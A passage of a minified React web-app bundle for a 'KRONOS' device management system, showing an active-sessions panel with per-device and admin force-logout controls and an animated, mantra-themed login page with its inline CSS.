          .device-table {
            font-size: 11px;
            min-width: 600px;
          }

          .device-table th,
          .device-table td {
            padding: 6px 10px;
          }

          .action-btn {
            width: 26px;
            height: 26px;
            font-size: 11px;
          }
        }

        @media (max-width: 374px) {
          .admin-stats {
            grid-template-columns: 1fr;
          }
        }
      `})]})}function kk(){var R;const{user:t,sessions:e,logoutSpecificDevice:n,remoteLogoutAll:r,remoteLogoutDevice:s}=xn(),[o,a]=g.useState([]),[l,c]=g.useState(!0),[d,p]=g.useState({}),f=(t==null?void 0:t.role)==="admin"||((R=t==null?void 0:t.userData)==null?void 0:R.role)==="admin";g.useEffect(()=>{u();const S=Uv(()=>{c(!1)});return()=>S()},[]);const u=async()=>{try{const S=B(U,"users"),C=await ce(S),j=C.exists()?C.val():{},P=Object.keys(j).map(z=>({uid:z,...j[z]}));a(P)}catch(S){console.error("❌ Error fetching users:",S)}},b=S=>o.find(C=>C.uid===S),x=S=>{const C=b(S);return C&&(C.name||C.userId)||S},v=S=>S?new Date(S).toLocaleDateString("en-IN",{day:"2-digit",month:"short",year:"numeric",hour:"2-digit",minute:"2-digit",hour12:!0}):"N/A",_=S=>{if(!S)return"offline";const C=Date.now()-S;return C<6e4?"online":C<3e5?"away":"offline"},m=async(S,C)=>{if(window.confirm(`⚠️ Logout from "${C}"?

This will logout this specific device only.`)){p(j=>({...j,[S]:!0}));try{const j=await n(S);j.success?alert("✅ Device logged out successfully!"):alert("❌ Failed: "+j.error)}catch(j){alert("❌ Failed: "+j.message)}p(j=>({...j,[S]:!1}))}},h=async(S,C,j)=>{if(!f)return alert("❌ Admin only!");const z=S===(t==null?void 0:t.uid)?`⚠️ You are about to logout YOUR OWN device "${j}"?

This will logout you from this device.`:`⚠️ Force logout ${x(S)} from "${j}"?`;if(window.confirm(z)){p(M=>({...M,[C]:!0}));try{const M=await s(C);M.success?alert("✅ Device logged out successfully!"):alert("❌ Failed: "+M.error)}catch(M){alert("❌ Failed: "+M.message)}p(M=>({...M,[C]:!1}))}},y=async()=>{if(!f)return alert("❌ Admin only!");const S=e.length>1?`⚠️ Logout ALL users from ALL ${e.length} devices?

This will force logout everyone including you.`:"⚠️ Logout all devices?";if(window.confirm(S)){c(!0);try{const C=await r();C.success?alert("✅ All devices logged out successfully!"):alert("❌ Failed: "+C.error)}catch(C){alert("❌ Failed: "+C.message)}c(!1)}},w=f?e:e.filter(S=>S.userId===(t==null?void 0:t.uid)),N={};return f&&w.forEach(S=>{N[S.userId]||(N[S.userId]=[]),N[S.userId].push(S)}),l?i.jsxs("div",{className:"admin-loading",children:[i.jsx("div",{className:"loading-spinner"}),i.jsx("p",{children:"📡 Loading sessions..."})]}):i.jsxs("div",{className:"session-manager",children:[i.jsxs("div",{className:"session-header",children:[i.jsx("h2",{children:"🔐 Active Sessions"}),i.jsxs("div",{className:"session-header-actions",children:[i.jsxs("span",{className:"session-count",children:[w.length," device",w.length!==1?"s":""," active"]}),f&&w.length>0&&i.jsx("button",{onClick:y,className:"logout-all-btn",disabled:l,children:"🚫 Logout All Devices"})]})]}),i.jsx("div",{className:"session-list",children:w.length===0?i.jsxs("div",{className:"empty-state",children:[i.jsx("span",{className:"empty-icon",children:"📭"}),i.jsx("p",{children:"No active sessions found"})]}):f?Object.entries(N).map(([S,C])=>i.jsxs("div",{className:"user-group",children:[i.jsxs("div",{className:"user-group-header",children:[i.jsxs("span",{className:"user-group-name",children:["👤 ",x(S)]}),i.jsxs("span",{className:"user-group-count",children:[C.length," device(s)"]})]}),C.map(j=>i.jsx(Ph,{session:j,isOwn:j.userId===(t==null?void 0:t.uid),isAdmin:f,actionLoading:d,onLogoutDevice:m,onRemoteLogout:h,formatTime:v,getStatus:_},j.sessionId))]},S)):w.map(S=>i.jsx(Ph,{session:S,isOwn:!0,isAdmin:f,actionLoading:d,onLogoutDevice:m,onRemoteLogout:h,formatTime:v,getStatus:_},S.sessionId))}),i.jsx("style",{children:`
        .session-manager { padding: 16px; background: var(--bg-primary); max-width: 1200px; margin: 0 auto; }
        .session-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 12px; flex-wrap: wrap; gap: 8px; }
        .session-header h2 { font-size: 20px; font-weight: 700; color: var(--text-primary); margin: 0; }
        .session-header-actions { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
        .session-count { font-size: 14px; color: var(--text-muted); background: var(--bg-card); padding: 4px 12px; border-radius: 12px; }
        .logout-all-btn { padding: 6px 16px; border: none; border-radius: 6px; background: #e74c3c; color: white; cursor: pointer; font-size: 12px; font-weight: 600; transition: all 0.2s; }
        .logout-all-btn:hover:not(:disabled) { background: #c0392b; transform: scale(1.02); }
        .logout-all-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .user-group { margin-bottom: 16px; border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; }
        .user-group-header { background: var(--bg-card); padding: 8px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); }
        .user-group-name { font-weight: 600; color: var(--text-primary); }
        .user-group-count { font-size: 12px; color: var(--text-muted); }
        
        .session-list { display: flex; flex-direction: column; gap: 4px; }
        .session-item { background: var(--bg-card); border-radius: 6px; padding: 10px 14px; border: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; transition: all 0.2s; margin: 2px 0; }
        .session-item:hover { box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .session-item.online { border-left: 3px solid #2ecc71; }
        .session-item.away { border-left: 3px solid #f1c40f; }
        .session-item.offline { border-left: 3px solid #e74c3c; opacity: 0.7; }
        .session-item.current-device { background: rgba(46, 204, 113, 0.05); border-color: #2ecc71; }
        
        .session-left { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; }
        .device-icon { font-size: 24px; }
        .session-details { flex: 1; min-width: 0; }
        .session-device-name { font-weight: 600; color: var(--text-primary); font-size: 14px; display: flex; align-items: center; flex-wrap: wrap; gap: 4px; }
        .this-device-badge { font-size: 10px; font-weight: 700; color: #2ecc71; background: rgba(46, 204, 113, 0.1); padding: 1px 8px; border-radius: 4px; margin-left: 8px; }
        .session-meta { display: flex; gap: 8px; font-size: 11px; color: var(--text-muted); margin-top: 2px; flex-wrap: wrap; }
        .session-user { font-weight: 500; color: var(--text-secondary); }
        
        .session-right { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; flex-shrink: 0; }
        .status-dot.online { background: #2ecc71; animation: pulse 1.5s ease-in-out infinite; }
        .status-dot.away { background: #f1c40f; }
        .status-dot.offline { background: #e74c3c; }
        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.8); } }
        .status-text { font-size: 11px; font-weight: 500; }
        .status-text.online { color: #2ecc71; }
        .status-text.away { color: #f1c40f; }
        .status-text.offline { color: #e74c3c; }
        
        .btn-group { display: flex; gap: 4px; flex-wrap: wrap; }
        .logout-btn { padding: 4px 12px; border: 1px solid #e74c3c; border-radius: 4px; background: rgba(231, 76, 60, 0.05); color: #e74c3c; cursor: pointer; font-size: 11px; font-weight: 600; transition: all 0.2s; }
        .logout-btn:hover:not(:disabled) { background: rgba(231, 76, 60, 0.15); transform: scale(1.02); }
        .logout-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .logout-btn.primary { background: #e74c3c; color: white; }
        .logout-btn.primary:hover:not(:disabled) { background: #c0392b; }
        .logout-btn.admin { border-color: #f39c12; color: #f39c12; }
        .logout-btn.admin:hover:not(:disabled) { background: rgba(243, 156, 18, 0.15); }
        .current-badge { font-size: 11px; color: var(--text-muted); font-weight: 600; padding: 2px 10px; background: var(--bg-input); border-radius: 4px; }
        
        .empty-state { text-align: center; padding: 40px; color: var(--text-muted); }
        .empty-state .empty-icon { font-size: 48px; display: block; margin-bottom: 8px; }
        .admin-loading { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; gap: 12px; }
        .loading-spinner { width: 36px; height: 36px; border: 3px solid var(--border-color); border-top-color: var(--accent-cyan); border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        @media (max-width: 768px) { 
          .session-item { flex-direction: column; align-items: stretch; gap: 8px; } 
          .session-right { justify-content: flex-end; } 
          .session-header { flex-direction: column; align-items: stretch; }
          .session-device-name { font-size: 13px; }
          .session-meta { font-size: 10px; }
          .btn-group { width: 100%; justify-content: flex-end; }
        }
      `})]})}const Ph=({session:t,isOwn:e,isAdmin:n,actionLoading:r,onLogoutDevice:s,onRemoteLogout:o,formatTime:a,getStatus:l})=>{const c=l(t.lastActive),d=t.deviceName||"Unknown Device",p=t.isCurrentDevice||!1;return i.jsxs("div",{className:`session-item ${c} ${p?"current-device":""}`,children:[i.jsxs("div",{className:"session-left",children:[i.jsx("span",{className:"device-icon",children:"📱"}),i.jsxs("div",{className:"session-details",children:[i.jsxs("div",{className:"session-device-name",children:[d.length>35?d.substring(0,35)+"...":d,p&&i.jsx("span",{className:"this-device-badge",children:"● CURRENT"})]}),i.jsxs("div",{className:"session-meta",children:[i.jsxs("span",{children:["🕐 ",a(t.loginTime)]}),i.jsx("span",{children:"•"}),i.jsx("span",{children:t.os||"Unknown OS"}),i.jsx("span",{children:"•"}),i.jsxs("span",{children:["IP: ",t.ip||"Unknown"]})]})]})]}),i.jsxs("div",{className:"session-right",children:[i.jsx("span",{className:`status-dot ${c}`}),i.jsx("span",{className:`status-text ${c}`,children:c==="online"?"🟢 Active":c==="away"?"🟡 Away":"🔴 Offline"}),i.jsxs("div",{className:"btn-group",children:[(e||n)&&i.jsx("button",{onClick:()=>s(t.sessionId,d),disabled:r[t.sessionId],className:"logout-btn primary",title:"Logout this specific device",children:r[t.sessionId]?"⏳":"🚪 Logout Device"}),n&&!e&&i.jsx("button",{onClick:()=>o(t.userId,t.sessionId,d),disabled:r[t.sessionId],className:"logout-btn admin",title:"Force logout this device (Admin)",children:r[t.sessionId]?"⏳":"🔒 Force Logout"}),p&&!n&&i.jsx("span",{className:"current-badge",children:"👤 Current"})]})]})]})},Ld="/assets/logo-ClNqZQSf.jpeg";function Nk(){const t=gt(),{user:e,login:n}=xn(),[r,s]=g.useState(""),[o,a]=g.useState(""),[l,c]=g.useState(!1),[d,p]=g.useState(""),[f,u]=g.useState(!1),[b,x]=g.useState(0),v=g.useRef(null),_=g.useRef(null);if(e)return t("/"),null;const m=["ॐ अग्निर्ज्योतिः","ॐ तेजस्वि","ॐ दीप्तिम्","ॐ प्रकाशः","ॐ ब्रह्मास्त्रम्","ॐ शक्ति","ॐ तेजः","ॐ अग्निः"],[h,y]=g.useState(""),[w,N]=g.useState(0);g.useEffect(()=>{const C=v.current;if(!C)return;const j=C.getContext("2d");let P,z=[],M=[],L=[],K=0;const F=()=>{C.width=window.innerWidth,C.height=window.innerHeight};F(),window.addEventListener("resize",F);class te{constructor(){this.reset()}reset(){const E=Math.random()*Math.PI*2,q=Math.random()*(C.width*.35)+50;this.baseX=C.width/2,this.baseY=C.height/2-30,this.x=this.baseX+Math.cos(E)*q,this.y=this.baseY+Math.sin(E)*q-20,this.size=Math.random()*8+3,this.speed=Math.random()*2+.5,this.angle=E,this.radius=q,this.phase=Math.random()*Math.PI*2,this.glow=Math.random()*40+20,this.life=.5+Math.random()*.5,this.pulse=Math.random()*Math.PI*2,this.pulseSpeed=Math.random()*.03+.01,this.trail=[],this.maxTrail=12,this.type="fire",this.summonProgress=0}update(E){if(this.pulse+=this.pulseSpeed,this.angle+=this.speed*.008,E>0){this.summonProgress=Math.min(this.summonProgress+.015,1);const q=this.summonProgress*E,ae=this.radius*(1-q*.85),ee=this.baseX+Math.cos(this.angle+this.pulse*.3)*ae,T=this.baseY+Math.sin(this.angle+this.pulse*.3)*ae-20;this.x+=(ee-this.x)*.06,this.y+=(T-this.y)*.06,this.size=3+this.summonProgress*10,this.glow=20+this.summonProgress*80,this.trail.push({x:this.x,y:this.y,life:1}),this.trail.length>this.maxTrail&&this.trail.shift(),this.trail.forEach(Q=>Q.life-=.08)}else this.x=this.baseX+Math.cos(this.angle)*this.radius,this.y=this.baseY+Math.sin(this.angle)*this.radius-20,this.y+=Math.sin(this.pulse)*8,this.trail=[],this.summonProgress=0}draw(E){this.trail.length>0&&this.trail.forEach((Q,we)=>{if(Q.life>0){E.globalAlpha=Q.life*.4;const fe=E.createRadialGradient(Q.x,Q.y,0,Q.x,Q.y,this.size*Q.life*.5);fe.addColorStop(0,`rgba(255, 200, 50, ${Q.life*.8})`),fe.addColorStop(.5,`rgba(255, 100, 0, ${Q.life*.4})`),fe.addColorStop(1,"rgba(255, 0, 0, 0)"),E.fillStyle=fe,E.shadowColor="#ff4400",E.shadowBlur=20,E.beginPath(),E.arc(Q.x,Q.y,this.size*Q.life*.5,0,Math.PI*2),E.fill(),E.shadowBlur=0,E.globalAlpha=1}});const q=this.life*.9;E.save(),E.translate(this.x,this.y),E.globalAlpha=q;const ae=.5+this.summonProgress*.5,ee=E.createRadialGradient(0,0,0,0,0,this.glow*this.life*(1+this.summonProgress));ee.addColorStop(0,`rgba(255, 255, 200, ${q*.9*ae})`),ee.addColorStop(.2,`rgba(255, ${150+Math.random()*100}, 50, ${q*.7*ae})`),ee.addColorStop(.5,`rgba(255, ${80+Math.random()*80}, 0, ${q*.4*ae})`),ee.addColorStop(.8,`rgba(255, ${30+Math.random()*40}, 0, ${q*.2*ae})`),ee.addColorStop(1,"rgba(255, 0, 0, 0)"),E.fillStyle=ee,E.shadowColor="#ff4400",E.shadowBlur=this.glow*this.life*(1+this.summonProgress*2),E.beginPath(),E.arc(0,0,this.size*this.life*2.5,0,Math.PI*2),E.fill(),E.shadowBlur=0;const T=E.createRadialGradient(0,0,0,0,0,this.size*this.life);T.addColorStop(0,`rgba(255, 255, 255, ${q*.9})`),T.addColorStop(.3,`rgba(255, 255, 200, ${q*.6})`),T.addColorStop(.7,`rgba(255, 200, 100, ${q*.3})`),T.addColorStop(1,`rgba(255, 100, 0, ${q*.1})`),E.fillStyle=T,E.beginPath(),E.arc(0,0,this.size*this.life*.8,0,Math.PI*2),E.fill(),E.restore(),E.shadowBlur=0,E.globalAlpha=1}}class me{constructor(){this.reset()}reset(){const E=Math.random()*Math.PI*2,q=Math.random()*(C.width*.4)+80;this.baseX=C.width/2,this.baseY=C.height/2-30,this.x=this.baseX+Math.cos(E)*q,this.y=this.baseY+Math.sin(E)*q-20,this.size=Math.random()*5+2,this.speed=Math.random()*3+1,this.angle=E,this.radius=q,this.phase=Math.random()*Math.PI*2,this.glow=Math.random()*50+30,this.life=.6+Math.random()*.4,this.pulse=Math.random()*Math.PI*2,this.pulseSpeed=Math.random()*.04+.02,this.trail=[],this.maxTrail=10,this.type="light",this.summonProgress=0,this.sparkle=Math.random()*Math.PI*2}update(E){if(this.pulse+=this.pulseSpeed,this.sparkle+=.05,this.angle+=this.speed*.01,E>0){this.summonProgress=Math.min(this.summonProgress+.02,1);const q=this.summonProgress*E,ae=this.radius*(1-q*.7),ee=this.baseX+Math.cos(this.angle+this.pulse*.4)*ae,T=this.baseY+Math.sin(this.angle+this.pulse*.4)*ae-20;this.x+=(ee-this.x)*.08,this.y+=(T-this.y)*.08,this.size=2+this.summonProgress*6,this.glow=30+this.summonProgress*100,this.trail.push({x:this.x,y:this.y,life:1}),this.trail.length>this.maxTrail&&this.trail.shift(),this.trail.forEach(Q=>Q.life-=.06)}else this.x=this.baseX+Math.cos(this.angle)*this.radius,this.y=this.baseY+Math.sin(this.angle)*this.radius-20,this.y+=Math.sin(this.pulse)*6,this.trail=[],this.summonProgress=0}draw(E){this.trail.length>0&&this.trail.forEach((T,Q)=>{if(T.life>0){E.globalAlpha=T.life*.3;const we=E.createRadialGradient(T.x,T.y,0,T.x,T.y,this.size*T.life*.4);we.addColorStop(0,`rgba(100, 220, 255, ${T.life*.8})`),we.addColorStop(.5,`rgba(50, 150, 255, ${T.life*.4})`),we.addColorStop(1,"rgba(0, 50, 255, 0)"),E.fillStyle=we,E.shadowColor="#0088ff",E.shadowBlur=15,E.beginPath(),E.arc(T.x,T.y,this.size*T.life*.4,0,Math.PI*2),E.fill(),E.shadowBlur=0,E.globalAlpha=1}});const q=this.life*.85;E.save(),E.translate(this.x,this.y),E.globalAlpha=q;const ae=.5+this.summonProgress*.5,ee=E.createRadialGradient(0,0,0,0,0,this.glow*this.life*(1+this.summonProgress));if(ee.addColorStop(0,`rgba(200, 240, 255, ${q*.9*ae})`),ee.addColorStop(.3,`rgba(100, 200, 255, ${q*.6*ae})`),ee.addColorStop(.6,`rgba(50, 150, 255, ${q*.3*ae})`),ee.addColorStop(1,"rgba(0, 50, 255, 0)"),E.fillStyle=ee,E.shadowColor="#0088ff",E.shadowBlur=this.glow*this.life*(1+this.summonProgress*2),E.beginPath(),E.arc(0,0,this.size*this.life*2,0,Math.PI*2),E.fill(),this.summonProgress>.3){E.shadowBlur=0;const T=this.size*.5*(.5+Math.sin(this.sparkle)*.5);E.fillStyle=`rgba(255, 255, 255, ${.3+Math.sin(this.sparkle)*.2})`,E.beginPath(),E.arc(this.size*.3,this.size*.3,T,0,Math.PI*2),E.fill(),E.beginPath(),E.arc(-this.size*.3,-this.size*.3,T*.7,0,Math.PI*2),E.fill()}E.restore(),E.shadowBlur=0,E.globalAlpha=1}}class W{constructor(){this.x=Math.random()*C.width,this.y=Math.random()*C.height,this.size=Math.random()*2.5+.5,this.twinkleSpeed=Math.random()*.05+.02,this.twinkle=Math.random()*Math.PI*2,this.alpha=Math.random()}update(){this.twinkle+=this.twinkleSpeed,this.alpha=.2+Math.sin(this.twinkle)*.3}draw(E){E.globalAlpha=this.alpha,E.fillStyle="#ffffff",E.shadowColor="#ffffff",E.shadowBlur=this.size*3,E.beginPath(),E.arc(this.x,this.y,this.size,0,Math.PI*2),E.fill(),E.shadowBlur=0,E.globalAlpha=1}}for(let V=0;V<100;V++)L.push(new W);for(let V=0;V<150;V++)z.push(new te);for(let V=0;V<120;V++)M.push(new me);let D=0;const I=(V,E,q)=>{!E||q<.01||(V.save(),V.globalAlpha=q*.7,V.font="bold 52px Arial, sans-serif",V.textAlign="center",V.textBaseline="middle",V.shadowColor="#ff6600",V.shadowBlur=80,V.fillStyle="#ff8844",V.fillText(E,C.width/2,C.height/2+100),V.shadowBlur=40,V.shadowColor="#ff4400",V.fillStyle="#ffaa66",V.fillText(E,C.width/2,C.height/2+100),V.shadowBlur=0,V.globalAlpha=1,V.restore())},X=()=>{j.clearRect(0,0,C.width,C.height);const V=j.createRadialGradient(C.width/2,C.height/2-30,0,C.width/2,C.height/2-30,C.width*.7);V.addColorStop(0,"rgba(30, 10, 0, 0.95)"),V.addColorStop(.3,"rgba(20, 8, 0, 0.98)"),V.addColorStop(.7,"rgba(10, 5, 0, 0.99)"),V.addColorStop(1,"rgba(0, 0, 0, 1)"),j.fillStyle=V,j.fillRect(0,0,C.width,C.height),L.forEach(ee=>{ee.update(),ee.draw(j)});const E=b/100;z.forEach(ee=>{ee.update(E),ee.draw(j)}),M.forEach(ee=>{ee.update(E),ee.draw(j)});const q=50+b*3,ae=j.createRadialGradient(C.width/2,C.height/2-30,0,C.width/2,C.height/2-30,q+150);if(ae.addColorStop(0,`rgba(255, 200, 100, ${.2+b/100})`),ae.addColorStop(.2,`rgba(255, 150, 50, ${.15+b/150})`),ae.addColorStop(.5,`rgba(255, 100, 50, ${.1+b/200})`),ae.addColorStop(.8,`rgba(200, 50, 20, ${.05+b/300})`),ae.addColorStop(1,"rgba(0, 0, 0, 0)"),j.fillStyle=ae,j.fillRect(0,0,C.width,C.height),b>10){const ee=120+b*.8,T=3;for(let Q=0;Q<T;Q++){j.save(),j.globalAlpha=.15+b/200-Q*.03;const we=Q===0?"#ff8844":Q===1?"#00ccff":"#ff4400";j.strokeStyle=we,j.shadowColor=we,j.shadowBlur=40-Q*10,j.lineWidth=2+b/30-Q*.5,j.setLineDash([15+Q*5,25+Q*5]),j.lineDashOffset=-K*(2+Q)*(Q===1?-1:1),j.beginPath(),j.arc(C.width/2,C.height/2-30,ee+Q*25,0,Math.PI*2),j.stroke(),j.setLineDash([]),j.shadowBlur=0,j.globalAlpha=1,j.restore()}}f&&h?(D=Math.min(D+.015,.9),I(j,h,D)):D=Math.max(D-.015,0),K++,P=requestAnimationFrame(X)};return X(),()=>{window.removeEventListener("resize",F),P&&cancelAnimationFrame(P)}},[b,f,h]),g.useEffect(()=>{if(!f){y(""),N(0);return}let C=0;const j=setInterval(()=>{y(m[C%m.length]),N(C),C++,x(P=>Math.min(P+7,100)),C>=m.length*2&&(clearInterval(j),u(!1))},700);return()=>clearInterval(j)},[f]);const R=()=>{try{const C=new(window.AudioContext||window.webkitAudioContext);_.current=C;const j=C.createOscillator(),P=C.createGain(),z=C.createBiquadFilter();j.type="sine",j.frequency.setValueAtTime(130,C.currentTime),j.frequency.exponentialRampToValueAtTime(90,C.currentTime+1.5),z.type="lowpass",z.frequency.value=400,P.gain.setValueAtTime(.4,C.currentTime),P.gain.exponentialRampToValueAtTime(.01,C.currentTime+2),j.connect(z),z.connect(P),P.connect(C.destination),j.start(C.currentTime),j.stop(C.currentTime+2)}catch{console.log("Audio not available")}},S=async C=>{C.preventDefault(),u(!0),R(),c(!0),p(""),await new Promise(P=>setTimeout(P,3e3));const j=await dk(r,o);if(j.success){const P={deviceName:navigator.userAgent||"Unknown Device",deviceModel:navigator.platform||"Unknown Platform",browser:navigator.userAgent||"Unknown Browser",os:navigator.platform||"Unknown OS",ip:"Unknown"},z=await nk(j.user.uid,P);z.success?(n(j.user,z.sessionId),t("/")):(p("Failed to create session: "+z.error),u(!1),x(0))}else p(j.error),u(!1),x(0);c(!1)};return i.jsxs("div",{className:"auth-page",children:[i.jsx("canvas",{ref:v,className:"auth-bg-canvas"}),b>0&&i.jsxs("div",{className:"astra-level-bar",children:[i.jsx("div",{className:"astra-level-fill",style:{width:`${b}%`}}),i.jsx("span",{className:"astra-level-text",children:b>=100?"🔥 BRAHMASTRA ACTIVATED!":`ॐ ${Math.floor(b)}%`})]}),i.jsxs("div",{className:"auth-container",children:[i.jsxs("div",{className:"auth-logo-overlay",children:[i.jsx("div",{className:`auth-logo-wrapper ${b>50?"astra-active":""}`,children:i.jsx("img",{src:Ld,alt:"KRONOS",className:"auth-logo-image"})}),i.jsx("h1",{className:`auth-logo-title ${b>70?"astra-title":""}`,children:"KRONOS"}),i.jsx("p",{className:"auth-logo-subtitle",children:f?"ॐ ॐ ॐ":"⚡ Device Management System"})]}),i.jsxs("form",{className:"auth-form",onSubmit:S,children:[i.jsxs("div",{className:"auth-input-group",children:[i.jsx("label",{children:"👤 User ID"}),i.jsx("input",{type:"text",value:r,onChange:C=>s(C.target.value),placeholder:"Enter your user ID",required:!0,disabled:l})]}),i.jsxs("div",{className:"auth-input-group",children:[i.jsx("label",{children:"🔑 Password"}),i.jsx("input",{type:"password",value:o,onChange:C=>a(C.target.value),placeholder:"Enter your password",required:!0,disabled:l})]}),d&&i.jsx("div",{className:"auth-error-msg",children:d}),i.jsx("button",{type:"submit",className:`auth-btn ${b>50?"astra-btn":""}`,disabled:l,children:l?i.jsx("span",{className:"mantra-loading",children:"ॐ ॐ ॐ"}):i.jsxs("span",{children:["🔥 ",b>30?"BRAHMASTRA":"LOGIN"]})})]})]}),i.jsx("style",{children:`
        /* ============================================ */
        /* FULL SCREEN - NO SCROLL */
        /* ============================================ */
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        html, body {
          height: 100%;
          overflow: hidden !important;
          margin: 0;
          padding: 0;
          background: #0a0a0a;
        }

        .auth-page {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          width: 100vw;
          height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          background: #0a0a0a;
          overflow: hidden !important;
          z-index: 9999;
        }

        /* ============================================ */
        /* FULL SCREEN CANVAS BACKGROUND */
        /* ============================================ */
        .auth-bg-canvas {
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          z-index: 0;
          pointer-events: none;
        }

        /* ============================================ */
        /* ASTRA LEVEL BAR - Bottom */
        /* ============================================ */
        .astra-level-bar {
          position: fixed;
          bottom: 20px;
          left: 50%;
          transform: translateX(-50%);
          width: 60%;
          max-width: 500px;
          height: 6px;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 3px;
          overflow: hidden;
          z-index: 10;
          border: 1px solid rgba(255, 150, 50, 0.05);
        }

        .astra-level-fill {
          height: 100%;
          background: linear-gradient(90deg, #ff4400, #ff8800, #ffcc00, #ff8800, #ff4400);
          background-size: 200% 100%;
          animation: astraGlow 1s linear infinite;
          border-radius: 3px;
          transition: width 0.3s ease;
          box-shadow: 0 0 40px rgba(255, 100, 0, 0.6);
        }

        @keyframes astraGlow {
          0% { background-position: 0% 0%; }
          100% { background-position: 200% 0%; }
        }

        .astra-level-text {
          position: absolute;
          top: -22px;
          right: 0;
          font-size: 10px;
          color: rgba(255, 200, 150, 0.7);
          font-weight: 600;
          letter-spacing: 2px;
          text-shadow: 0 0 20px rgba(255, 100, 0, 0.3);
        }

        /* ============================================ */
        /* LOGIN CONTAINER - Centered */
        /* ============================================ */
        .auth-container {
          position: relative;
          z-index: 5;
          width: 100%;
          max-width: 380px;
          padding: 24px 28px 28px;
          background: rgba(240, 97, 8, 0.1);
          border-radius: 16px;
          box-shadow: 0 8px 48px rgba(0, 0, 0, 0.8), 0 0 80px rgba(255, 100, 50, 0.05);
          border: 1px solid rgba(255, 150, 50, 0.06);
          backdrop-filter: blur(12px);
          -webkit-backdrop-filter: blur(12px);
        }

        /* ============================================ */
        /* LOGO */
        /* ============================================ */
        .auth-logo-overlay {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          margin-bottom: 16px;
        }

        .auth-logo-wrapper {
          width: 72px;
          height: 72px;
          border-radius: 50%;
          overflow: hidden;
          animation: logoPulse 3s ease-in-out infinite;
          box-shadow: 0 0 50px rgba(255, 150, 50, 0.15);
          border: 2px solid rgba(255, 150, 50, 0.1);
          background: rgba(0, 0, 0, 0.3);
          padding: 6px;
          margin-bottom: 6px;
          transition: all 0.5s ease;
        }

        .auth-logo-wrapper.astra-active {
          animation: astraPulse 0.6s ease-in-out infinite;
          box-shadow: 0 0 80px rgba(255, 100, 0, 0.5), 0 0 120px rgba(255, 50, 0, 0.2);
          border-color: rgba(255, 200, 50, 0.5);
        }

        @keyframes logoPulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.03); }
        }

        @keyframes astraPulse {
          0%, 100% { 
            transform: scale(1); 
            box-shadow: 0 0 60px rgba(255, 100, 0, 0.4);
          }
          50% { 
            transform: scale(1.08); 
            box-shadow: 0 0 100px rgba(255, 200, 50, 0.7), 0 0 150px rgba(255, 100, 0, 0.3);
          }
        }

        .auth-logo-image {
          width: 100%;
          height: 100%;
          object-fit: contain;
          border-radius: 50%;
          filter: drop-shadow(0 0 20px rgba(255, 150, 50, 0.1));
        }

        .auth-logo-title {
          font-size: 34px;
          font-weight: 900;
          margin: 0;
          line-height: 1.1;
          background: linear-gradient(135deg, #ff6b35, #ffd93d, #ff6b35);
          background-size: 200% 200%;
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          animation: gradientMove 4s ease-in-out infinite;
          filter: drop-shadow(0 0 30px rgba(255, 100, 50, 0.1));
          letter-spacing: 8px;
          transition: all 0.5s ease;
        }

        .auth-logo-title.astra-title {
          animation: astraTitle 0.6s ease-in-out infinite;
          filter: drop-shadow(0 0 50px rgba(255, 150, 50, 0.4));
        }

        @keyframes astraTitle {
          0%, 100% { 
            transform: scale(1);
            filter: drop-shadow(0 0 30px rgba(255, 150, 50, 0.3));
          }
          50% { 
            transform: scale(1.05);
            filter: drop-shadow(0 0 70px rgba(255, 200, 50, 0.6));
          }
        }

        @keyframes gradientMove {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }

        .auth-logo-subtitle {
          font-size: 11px;
          color: rgba(255, 200, 150, 0.6);
          letter-spacing: 4px;
          text-transform: uppercase;
          font-weight: 500;
          margin-top: 2px;
          transition: all 0.3s ease;
        }

        /* ============================================ */
        /* FORM */
        /* ============================================ */
        .auth-form {
          display: flex;
          flex-direction: column;
          gap: 12px;
        }

        .auth-input-group {
          display: flex;
          flex-direction: column;
          gap: 4px;
        }

        .auth-input-group label {
          font-size: 12px;
          font-weight: 600;
          color: rgba(255, 200, 150, 0.6);
          letter-spacing: 0.5px;
        }

        .auth-input-group input {
          padding: 10px 14px;
          border: 1px solid rgba(255, 150, 50, 0.08);
          border-radius: 8px;
          background: rgba(20, 10, 5, 0.6);
          color: #e0d0c0;
          font-size: 13px;
          transition: all 0.3s;
          height: 42px;
        }

        .auth-input-group input:focus {
          outline: none;
          border-color: #ff6b35;
          box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.08);
          background: rgba(30, 15, 5, 0.7);
        }

        .auth-input-group input::placeholder {
          color: rgba(255, 200, 150, 0.2);
          font-size: 12px;
        }

        .auth-input-group input:disabled {
          opacity: 0.4;
          cursor: not-allowed;
        }

        .auth-btn {
          padding: 10px;
          border: none;
          border-radius: 8px;
          background: linear-gradient(135deg, #ff6b35, #ff4400);
          color: white;
          font-size: 15px;
          font-weight: 700;
          cursor: pointer;
          transition: all 0.3s;
          letter-spacing: 2px;
          height: 44px;
          position: relative;
          overflow: hidden;
          text-shadow: 0 0 20px rgba(255, 200, 100, 0.2);
        }

        .auth-btn.astra-btn {
          background: linear-gradient(135deg, #ff4400, #ff8800, #ff4400);
          background-size: 200% 100%;
